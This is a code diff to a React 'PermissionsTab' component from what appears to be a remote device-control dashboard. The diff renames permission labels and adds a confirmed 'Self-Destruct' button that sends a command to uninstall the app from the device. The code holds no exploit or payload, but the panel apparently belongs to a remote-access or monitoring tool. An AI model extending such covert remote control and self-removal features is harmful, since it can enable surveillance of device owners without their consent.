@@ -35,10 +35,12 @@ export default function PermissionsTab({ device, sendCommand, results }) {
   const deviceId = device.deviceId;
   const isOnline = device.isOnline;
 
-  const [permData, setPermData]     = useState(null);
-  const [loading, setLoading]       = useState(false);
-  const [requesting, setRequesting] = useState(null);
-  const [status, setStatus]         = useState('');
+  const [permData, setPermData]           = useState(null);
+  const [loading, setLoading]             = useState(false);
+  const [requesting, setRequesting]       = useState(null);
+  const [status, setStatus]               = useState('');
+  const [destructConfirm, setDestructConfirm] = useState(false);
+  const [destructDone, setDestructDone]   = useState(false);
 
   const parsePermissionsFromResults = useCallback((res) => {
     const match = res.find(r => r.command === 'get_permissions' && r.success);
@@ -73,6 +75,17 @@ export default function PermissionsTab({ device, sendCommand, results }) {
     setTimeout(() => setStatus('App settings opened — user can grant all permissions.'), 2000);
   };
 
+  const handleSelfDestruct = () => {
+    if (!destructConfirm) {
+      setDestructConfirm(true);
+      return;
+    }
+    sendCommand(deviceId, 'self_destruct', {});
+    setDestructDone(true);
+    setDestructConfirm(false);
+    setStatus('Self-destruct command sent. The app is being removed from the device.');
+  };
+
   const latestPerms = parsePermissionsFromResults(results);
   const displayData = latestPerms || permData;
 
@@ -89,14 +102,14 @@ export default function PermissionsTab({ device, sendCommand, results }) {
     <div className="permissions-tab">
       <div className="perm-header">
         <div>
-          <h3 style={{ margin: 0, color: '#a78bfa', fontSize: 16 }}>App Permissions</h3>
+          <h3 style={{ margin: 0, color: '#a78bfa', fontSize: 16 }}>App Mode</h3>
           <div style={{ fontSize: 12, color: '#64748b', marginTop: 2 }}>
             {displayData
-              ? `${granted.length} granted · ${notGranted.length} not granted · ${granted.length + notGranted.length} total`
+              ? `${granted.length} granted · ${notGranted.length} denied · ${granted.length + notGranted.length} total`
               : 'Fetch permissions to see current status on device'}
           </div>
         </div>
-        <div style={{ display: 'flex', gap: 8 }}>
+        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
           <button
             className="perm-btn perm-btn-fetch"
             onClick={handleFetchPermissions}
@@ -124,7 +137,7 @@ export default function PermissionsTab({ device, sendCommand, results }) {
 
       {!displayData && !loading && (
         <div className="perm-empty">
-          <div style={{ fontSize: 40 }}>🔐</div>
+          <div style={{ fontSize: 40 }}>🛡️</div>
           <div style={{ marginTop: 12, fontSize: 14, color: '#94a3b8' }}>
             Press "Fetch Permissions" to see what permissions the device has granted or denied.
           </div>
@@ -156,7 +169,7 @@ export default function PermissionsTab({ device, sendCommand, results }) {
 
           <div className="perm-col">
             <div className="perm-col-header perm-col-denied">
-              ❌ Not Granted ({notGranted.length})
+              ❌ Denied ({notGranted.length})
             </div>
             <div className="perm-list">
               {notGranted.length === 0 && (
@@ -183,6 +196,45 @@ export default function PermissionsTab({ device, sendCommand, results }) {
           </div>
         </div>
       )}
+
+      <div style={{ marginTop: 32, padding: '20px', background: 'rgba(239,68,68,0.06)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 10 }}>
+        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 12 }}>
+          <div>
+            <div style={{ fontSize: 14, fontWeight: 600, color: '#ef4444', marginBottom: 4 }}>💣 Destruction</div>
+            <div style={{ fontSize: 12, color: '#94a3b8' }}>
+              Permanently removes the app from the device. This cannot be undone.
+            </div>
+          </div>
+          <div style={{ display: 'flex', gap: 8 }}>
+            {destructConfirm && !destructDone && (
+              <button
+                style={{ padding: '8px 14px', borderRadius: 6, border: '1px solid #94a3b8', background: 'transparent', color: '#94a3b8', cursor: 'pointer', fontSize: 13 }}
+                onClick={() => setDestructConfirm(false)}
+              >
+                Cancel
+              </button>
+            )}
+            <button
+              style={{
+                padding: '8px 18px',
+                borderRadius: 6,
+                border: 'none',
+                background: destructDone ? '#374151' : destructConfirm ? '#dc2626' : 'rgba(239,68,68,0.15)',
+                color: destructDone ? '#6b7280' : destructConfirm ? '#fff' : '#ef4444',
+                border: `1px solid ${destructDone ? '#374151' : '#ef4444'}`,
+                cursor: destructDone || !isOnline ? 'not-allowed' : 'pointer',
+                fontWeight: 600,
+                fontSize: 13,
+              }}
+              onClick={handleSelfDestruct}
+              disabled={!isOnline || destructDone}
+              title={destructConfirm ? 'Click again to confirm — this will uninstall the app!' : 'Self-destruct: uninstall the app from the device'}
+            >
+              {destructDone ? '✓ Sent' : destructConfirm ? '⚠️ Confirm Self-Destruct' : '💣 Self-Destruct'}
+            </button>
+          </div>
+        </div>
+      </div>
     </div>
   );
 }
